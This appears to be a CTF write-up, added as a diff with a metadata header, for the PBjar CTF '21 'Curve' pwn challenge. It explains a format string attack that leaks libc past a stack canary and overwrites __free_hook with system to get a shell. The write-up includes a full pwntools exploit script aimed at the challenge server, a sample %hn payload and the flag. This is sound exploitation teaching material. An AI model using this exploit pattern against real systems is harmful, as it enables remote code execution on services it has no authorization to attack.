@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://ctftime.org/writeup/30554
+CHALLENGE: CTFtime.org / PBjar CTF '21 / Curve / Writeup
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: format_string
+DIFFICULTY: Unknown
+PROTECTIONS: Canary
+KEY_FUNCTIONS: free, system
+KEY_TECHNIQUE: Writeup for CTFtime.org / PBjar CTF '21 / Curve / Writeup — format_string exploitation technique.
+---
+specifier %n works; we will overwrite 2 bytes at a time, so we need to place 4 consecutive addresses in the buffer (which will be 8th parameter, 9th parameter and so on), and we have to specify that each write must be of 2 bytes: %hn, i.e. short size integer. We also need to pay attention to the number of character written so far in general, because the use of %n specifier doesn't reset the count. As last thing, we have to ensure that the format string payload is shorter than 128 (see decompiled code). A possible format string, for a given libc base address: ``` %26739c%1$n%46557c%8$hn%3894c%9$hn%21044c%10$hn%32838c%11$hn ``` We managed to get the shell, and the flag, with this exploit. Here is the script. # Script ``` from pwn import ELF, process, remote, context, p64, u64 def main(): elf = ELF("./curve_patchelf") libc = ELF("./ libc-2.31.so ") context.binary = elf # r = process(elf.path) r = remote("143.198.127.103", 42004) # INPUT 1 payload = b"A"*(136 + 8 + 8) r.sendafter(b"Input 1:\n", payload) r.recv(136) # PADDING r.recv(8)   # PADDING OVER CANARY r.recv(8)   # PADDING OVER RBP leak = u64(r.recv(6) + b"\x00"*2) libc.address = leak - 234 - libc.symbols["__libc_start_main"] # INPUT 2 address = libc.symbols["__free_hook"] payload = b"".join([p64(address+(i*2)) for i in range(4)]) r.sendlineafter(b"Input 2:\n", payload) # INPUT 3 content = p64(libc.symbols["system"]) content = [content[i:i+2] for i in range(0, 8, 2)] offset = 8 s = b"sh\x00\x00" s = int.from_bytes(s, "little") payload = f"%{s}c%1$n" numwritten = s for i in range(len(content)): l = int.from_bytes(content[i], "little") x = (l - numwritten) % 0x10000 payload += f"%{x}c%{offset+i}$hn" numwritten = l assert len(payload) <= 0x80, "PAYLOAD TOO LONG" print(payload) r.sendlineafter(b"Input 3:\n", payload) r.interactive() if __name__ == "__main__": main() ``` flag{n0w_y0ur3_3v1l_m0rty_t00_s00n3r_0r_l4t3r_w3_4ll_4r3_s4dg3} Original writeup (https://pwnthenope.github.io/writeups/2021/09/27/curve.html). Comme
